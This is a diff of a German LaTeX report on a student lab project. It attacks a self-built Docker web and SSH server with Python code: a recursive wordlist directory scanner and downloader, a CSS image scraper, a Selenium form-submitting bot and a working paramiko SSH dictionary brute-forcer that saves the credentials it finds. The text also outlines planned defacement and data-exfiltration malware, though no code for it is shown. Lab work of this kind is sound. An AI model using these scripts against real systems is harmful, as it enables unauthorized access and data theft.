@@ -9,6 +9,7 @@
 \usepackage[ngerman]{babel}
 \usepackage[T1]{fontenc}
 \usepackage{graphicx}
+\usepackage{blt}
 \usepackage{lmodern}
 \usepackage{tabto}
 \usepackage{listings}
@@ -57,7 +58,7 @@ Anwendungen wie Webserver sind häufig der zentrale und angreifsbarste Teil eine
 Ziel dieses Projektes ist es die angreifbare Infrastrustur in Form des Webserver bereitzustellen und diesen anschließend anhand einer in Python programmierten Software anzugreifen.
 Der Angriff soll im ersten Schritt alle Inhalte des Opfer-Servers aufspüren und herunterladen. Anschließend sollten über den Browser alle Seiten automatisiert besucht und die Funktionalität genutzt werden.
 Des weiteren ist eine in der Infrastrustur bereitgestellte Schnittstelle wie SSH anhand eines Wörterbuch-Angriffs zu kompromitieren. Abschließend soll mit den erlangten Zugangsdaten eine Schadsoftware auf den Opfer-Server geladen werden, mit dieser ein defacement der gehosteten Webseite umgesetzt werden kann.\\
-Dieses Dokument beleuchtet die Umsetzung und Implementierung der einzelnen Schritte. 
+Dieses Dokument beleuchtet die Umsetzung und Implementierung der einzelnen Schritte.
 
 \newpage
 \section{Infrastrustur}
@@ -107,10 +108,10 @@ CMD ./entrypoint.sh
 \end{internallinenumbers}
 \end{shaded}
 \begin{center}
- Codebeispiel 1: Dockerfile des Http-SSH-Servers
+ Textbeispiel 1: Dockerfile des Http-SSH-Servers
 \end{center}
 Ein Container wird stets auf einem Base Image aufgebaut. Dieses dient als Fundament für alle folge Instruktionen und enthält je nach Image ein grundlegendes Dateisystem sowie vorinstallierte Software.\\
-In Zeile 1(vgl. Codebeispiel 1) wird als Base Image Ubuntu deklariert. 
+In Zeile 1(vgl. Textbeispiel 1) wird als Base Image Ubuntu deklariert. 
 Anschließend werden verschiedene Dienste wie openssh, git, nodejs sowie einige npm Packete installiert.
 In Zeile 10 wird das root Passwort für die Schnittstelle des Webservers bzw. Containers festgelegt. Die eigentliche Webanwendung wird in Zeile 13 als ein Repository durch git heruntergeladen und ins Zeile 15 installiert. In Zeile 16 wird das Kommando zum starten des SSH Dienstes und der Node Anwendung in ein Bash-Skript geschrieben, um dieses anschließend ausführbar zu machen und in Zeile 18 zu starten.\\
 Mit \colorbox{mshadecolor}{\parbox{0.46\textwidth}{Docker build -t victim-http-server .}} wird aus dem Dockerfile ein Image erstellt. Alternativ kann das kompilierte Image auch über Dockerhub mit \colorbox{mshadecolor}{\parbox{0.58\textwidth}{Docker pull mauriceKalevra/ssh-node-server}} geladen werden. Dieses kann nun mit \colorbox{mshadecolor}{\parbox{0.51\textwidth}{Docker run -p 22:22 victim-http-server}} gestartet werden. Nun läuft der HTTP Server und die Webanwendung ist im Browser unter
@@ -121,55 +122,192 @@ Als Webanwendung dient ein Projekt aus einem früheren Semester. Dort war es Auf
 \section{Angriffe auf den Opfer-Server}
 \subsection{Spider-Angriff}
 Bei einem Spider Angriff ist es Ziel alle Ressourcen eines Webservers aufzusprüren und Herunterzuladen.
-Folgendes Codebeispiel versucht in einer Funktion mit Hilfe des Moduls requests alle Verzeichnisse und Dateien auf einem Webserver ausfindig zu machen.
+In der Funktion 'myscrape'(vgl. Figure 1) war erster Ansatz mit hilfe der python Biblothek 'Beautifullsoup' alle html Dokumente ausfindig zu machen.
+Hierbei wird auch mit dem python modul 'requests' gearbeitet. Dieses nimmt als Parameter eine url entgegen und holt über ein http request das html Dokument ein(vgl. Zeile 2). Dieses wird nun mit Beautifullsoup geparsed(vgl. Zeile 3). In Zeile 5 werden nun in einer for schleife alle html hyperlink-tags gefunden, in Zeile 6 auf die urls minimiert(vgl. Zeile 7) und schließlich ausgegeben.
+\begin{figure}[h]
+ \caption{Python Funktion myscrape}
+ \begin{lstlisting}[language=python, style=code]
+ def myscrape(url):
+ 	r = requests.get(url)
+ 	soup = BeautifulSoup(r.text,"html.parser")
+  	for links in soup.find_all("a"):
+	 	href = links.attrs['href']
+	 	print(href)
+  
+ \end{lstlisting}
 
-Erster Ansatz war es mit hilfe der python Biblothek 'Beautifullsoup' alle html Dokumente ausfindig zu machen.
-Hierbei wird auch mit dem python modul 'requests' gearbeitet. Dieses nimmt als Parameter eine url entgegen und holt über ein http request das html Dokument ein(vgl. Zeile 2). Dieses wird nun mit Beautifullsoup geparsed(vgl. Zeile 3). In Zeile 5 werden nun in einer for schleife alle html hyperlink-tags gefunden, in Zeile 6 auf die urls minimiert(vgl. Zeile 7) und schließlich ausgegeben. Die einfache Funktion findet nahezu alle html Seiten.
-\begin{center}
- \includegraphics[scale=0.5]{data/scrapemy.png}
-\end{center}
-\begin{center}
- Codebeispiel 2: Python Funktion myscrape
-\end{center}
+\end{figure}
+\begin{figure}[h]
+ \caption{Ausgabe der Funktion myscrape}
+ \centering
+ \vspace{3mm}
+ \includegraphics[scale=0.4]{data/myscrape.png}
+ \end{figure}
+
+
 \newpage
-Um alle weiteren Html Dokumente sowie Verzeichhnisse und Bilder zu finden verwendet die Funktion 'mygobuster' Wörterlisten und Rekursion.
-\begin{center}
-\includegraphics[scale=0.5]{data/mygobuster.png}
-Codebeispiel 3: Python Funktion mygobuster
-\end{center}
+Um alle weiteren Html Dokumente sowie Verzeichnisse und Bilder zu finden, wird die Klasse 'mySpider' implementiert. Die Methode 'mygobuster' verwendet unter anderem Wörtlisten um weitere Resourcen zu finden.
+\begin{figure}[h]
+\caption{Python Funktion mygobuster}
+\begin{lstlisting}[language=python, style=Code]
+def mygobuster(self,target):
+	wordlist = [a.strip() for a in open("wordlist.txt")]
+	filters = [".html",".css","jpg", "",".js",".md",".png"]
+	html = open("html.txt", "a+") 
+	for word in wordlist:
+		for f in filters:
+			url = target+word+f
+			re = requests.head(url)
+		
+			if re.status_code==301 or re.status_code==401:
+				print("Directory found: ", re.url, re.status_code)
+				newurl = re.url+"/"
+			
+				self.mygobuster(newurl)
+			
+			elif re.status_code==200:
+				print("Found: ", re.url, re.status_code)
+				response = urllib.request.urlopen(url)
+				if ".html" in re.url:
+					html.write(re.url+"\n")
+				try:
+					Content = response.read().decode('utf-8')
+					f =open("found/"+str(re.url).replace("/",""), 'w+')
+					f.write(Content)
+					f.close()
+				except:
+					Content = response.read()
+					f=open("found/"+str(re.url).replace("/",""), 'wb+')
+					f.write(Content)
+					f.close()
+				else:
+					continue
+\end{lstlisting}
+\end{figure}
+
 Hierbei wird in Zeile 2 eine Wörterliste mit üblichen Nodejs-Verzeichnis und Dateinamen anhand einer List Comprehension eingelesen und entsprechend formatiert.
 In der Liste 'filters' befinden sich Dateiendungen nach denen gesucht werden soll. Nun wird über beide Listen iteriert und diese mit der url des Opfer-Servers verknüpft(vgl. Zeile 7) und dem Modul request übergeben(vgl. Zeile 8). Mit diesem ist es möglich Http Funktionalitäten zu nutzen. So wird ein Http request an den Opfer-Server geschickt und der Response code ausgelesen(vgl. Zeile 10). Gibt der Webserver den Statuscode 301 zurück, so heißt dies dass die gefunde Resource ein Verzeichnis darstellt. Der Pfad wird ausgegeben und der Variable 'newurl' zugewiesen. Anschließend wird in Zeile 14 die Funktion rekursiv aufgerufen um nach tieferen Verzeichnissen zu suchen. Lautet der Statuscode 200, handelt es sich um eine gefunde Datei wie Html, Css oder Javascript. Auch hier wird der Pfad ausgegeben und zudem entsprechend
  der Dateiendung in eine Datei geschrieben(vgl. Zeile 20). Ab Zeile 21 wird zudem in einem try-except Block der Fall abgefangen das ein binary File gefunden wird.  
- 
- 
 Die Funktion ist in der Lage ein großteil der Dateien und Verzeichnisse zu finden. 
 
 Des weiteren versucht die Funktion CSSbuster weitere Dateien ausfindig zu machen, die in CSS Dateien angegeben sind. Hierbei wird mit Regulären ausdrücken die CSS Datei auf urls untersucht(vgl. Zeile 5). Anschließend werden mit ähnlichem Ansatz die Dateien heruntergeladen und der Pfad in eine Datei geschrieben.
-\begin{center}
-\includegraphics[scale=0.5]{data/cssbuster.png}
-\end{center}
-\begin{center}
- Codebeispiel 4: CSSbuster
-\end{center}
+\begin{figure}[h]
+ \caption{CSSbuster}
+ \begin{lstlisting}[language=python, style=code, basicstyle=\scriptsize]
+ def CSSbuster(self, target):
+ 		r  = requests.get(" http://172.17.0.2:1337/stylesheet.css")
+ 		data = r.text
+ 		l = []
+ 		for i in re.findall('url\(([^)]+)\)',data):
+	 		l.append(i)
+	 		s = [x[2:].strip('""') for x in l[:2]]
+	 		for j in s:
+		 		response = urllib.request.urlopen(target+j)
+		 		if response.code==200:
+			 		print("Picture found:", target+j)
+			 		con = response.read()
+			 		f = open("found/"+str(response.url).replace("/",""), 'wb+')
+			 		f.write(con)
+				else:
+					pass
+ \end{lstlisting}
+\end{figure}
+
 Die Funktion findet alle in CSS Dateien hinterlegten Bilder.
 \newpage
 \subsection{Selenium Browser Angriff}
 Bei diesem Angriff sollen automatisiert möglichst alle Seiten der Webanwendung besucht werden. Zudem sollen Funktionalitäten wie Formulare befüllt und abgeschickt werden.
-\begin{center}
- \includegraphics[scale=0.5]{data/bot.png}
-\end{center}
-Anfangs wird der entsprechende Treiber für den Firefox browser eingeladen(vgl. Zeile 2-3). Anschließend wird über die zuvor angelegte Datei mit den Html Dokumenten iteriert und jeweilige Seiten geöffnet. In der Seite 'biete.html' werden zudem Formulardaten eingetragen und abgeschickt(vgl. Zeile 7-23).
+\begin{figure}[h]
+\caption{Bot Angriff mit Selenium}
+ \begin{lstlisting}[language=python, style=code]
+ def myBot(self):
+ 	s=Service('/home/sleven/Studium/Sem5/Hacking-mit-Python/geckodriver')
+ 	browser = webdriver.Firefox(service=s)
+ 	for url in open("html.txt"):
+		 if url=="http://172.17.0.2:1337/biete.html\n":
+		 browser.get(url)
+		 time.sleep(1)
+		 eingabe = browser.find_element(By.ID,"ort")
+		 eingabe.send_keys("Salzburg")
+		 eingabe2 = browser.find_element(By.ID,"preis")
+		 eingabe2.send_keys("1500")
+		 time.sleep(1)
+		 eingabe2 = browser.find_element(By.ID,"zimmer")
+		 eingabe2.send_keys("5")
+		 eingabe3 = browser.find_element(By.ID,"flaeche")
+		 eingabe3.send_keys("500")
+		 eingabe4 = browser.find_element(By.ID,"kontakt")
+		 eingabe4.send_keys("Mori.r@web.de")
+		 ein = browser.find_element(By.ID,"saveimmoButton")
+		 ein.click()
+		 time.sleep(1)
+		 browser.get(url)
+ \end{lstlisting}
+
+\end{figure}
+
+Anfangs wird der entsprechende Treiber für den Firefox browser eingeladen(vgl. Zeile 2-3). Anschließend wird über die zuvor angelegte Datei mit den Html Dokumenten iteriert und jeweiligen Seiten mit browser.get' geöffnet. In der Seite 'biete.html' werden zudem Formulardaten eingetragen und abgeschickt(vgl. Zeile 5-22).
 \newpage
 \subsection{SSH Angriff}
 Hierbei sollen Admin-Schnittstellen angegriffen und Kompromitiert werden.
-Die Webanwendung wird über eine SSH Schnittstelle gewartet. Nun  wird versucht anhand eines Wörtbuch Angriffes an die Anmeldedaten zu gelangen.
-\begin{center}
- \includegraphics[scale=0.5]{data/ssh.png}
-\end{center}
-Anfangs wird eine que angelegt, die in einer Exception befüllt wird(vgl. Zeile 28). Die Funktion wird anschließend erneut aufgerufen und es wird überprüft ob die que leer ist. Nun wird die Paramiko Biblothek aufgerufen(vgl. Zeile 8). Diese bietet SSH Implementierungen für client und serverseitige Funktionalitäten. Ab Zeile 11 wird Username und Passwort aus der que ausgelesen und entsprechen formatiert. Nun wird versucht eine Verbindung mit den übergebenen Anmeldedaten herzustellen(vglt. Zeile 14). Ist die verbidnung erfolgreich, werden Nutzername und Passwort ausgegeben(vgl. Zeile 16), sowie das Programm gestoppt. Im gleichen Schleifendurchlauf werden zudem exceptions abgefangen. Die Funktion findet das Passwort und gibt es aus.\\
+Die Webanwendung wird über eine SSH Schnittstelle gewartet. Nun  wird versucht aanhand eines Wörtbuch Angriffes an die Anmeldedaten zu gelangen.
+ \begin{lstlisting}[language=python, style=code, basicstyle=\scriptsize]
+ def attackssh(ip):
+ 		try:
+ 			global que
+ 			if len(que)==0:
+	 			print("Not found, maybe try a new wordlist?!")
+	 			return 1
+	 		print("Attacking ssh.....")
+	 		ssh = paramiko.SSHClient()
+	 		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	 		for line in range(len(que)):
+		 		[username, password] = que.popleft().strip().split()
+		 		try:
+		 			print(f"Trying with {username} {password}")
+		 			conn = ssh.connect(ip, username=username,password=password, 			banner_timeout=200)
+		 			if conn is None:
+						print(username)
+			 			credentials = open("cred.txt", "r+")
+			 			credentials.write(username)
+			 			credentials.write(" ")
+			 			credentials.write(password)
+			 			print(f"Successfully Authenticated with {username} {password}")
+			 			break
+			 except paramiko.AuthenticationException:
+					print("Failed!")
+			 		continue
+			 except paramiko.SSHException:
+			 		continue
+			 except NameError:
+					que = deque()
+					for word in open("sshwordlist.txt", "r").readlines():
+							que.append(word)
+					attackssh("172.17.0.2")
+				 										Figure 5: SSH-Attack
+ \end{lstlisting}
+Anfangs wird eine que angelegt, die in einer Exception befüllt wird(vgl. Zeile 28). Die Funktion wird anschließend erneut aufgerufen und es wird überprüft ob die que leer ist. \newpage Nun wird die Paramiko Biblothek aufgerufen(vgl. Zeile 8). Diese bietet SSH Implementierungen für client und serverseitige Funktionalitäten. Ab Zeile 11 wird Username und Passwort aus der que ausgelesen und entsprechen formatiert. Nun wird versucht eine Verbindung mit den übergebenen Anmeldedaten herzustellen(vglt. Zeile 14). Ist die verbidnung erfolgreich, werden Nutzername und Passwort ausgegeben(vgl. Zeile 16) und in die Datei 'cred.txt' geschrieben. Im gleichen Schleifendurchlauf werden zudem exceptions abgefangen. Die Funktion findet das Passwort und gibt es aus.\\
+
 \begin{center}
 \includegraphics[scale=0.5]{data/success.png}
 \end{center}
 \subsection{Schadsoftware}
-Nun soll über die erlangten Zugangsdaten eine Schadware auf den Opfer Server geladen werden, die ein Defacement der Seite umsetzt und zudem die Zugangsdaten der Schnittstelle ändert.
+Nun soll über die erlangten Zugangsdaten eine Schadware auf den Opfer Server geladen werden. Dort soll ein Defacement der Seite umgesetzt und zudem die Zugangsdaten der Schnittstelle geändert werden. Des weiteren sollen von außen nicht zugängliche Dokumente auf ein anderen remote Server geladen werden.
+
+\newpage
+Die Funktion 'getCredentials' ließt die Zugangsdaten aus der Datei 'cred.txt' aus und formatiert diese entsprechend.
+\begin{figure}[h]
+ \caption{getCredentials}
+ \begin{lstlisting}[language=python, style=code]
+def getCredentials():
+ 	#hole gefunde credentials aus datei
+ 	cred = open('cred.txt','r').readlines()
+ 	#case zu string
+ 	cred_string = cred[0].split()
+ 	#lese username und passwort aus
+ 	user = cred_string[0]
+ 	pw = cred_string[1]
+ \end{lstlisting}
+\end{figure}
+
 \end{document}
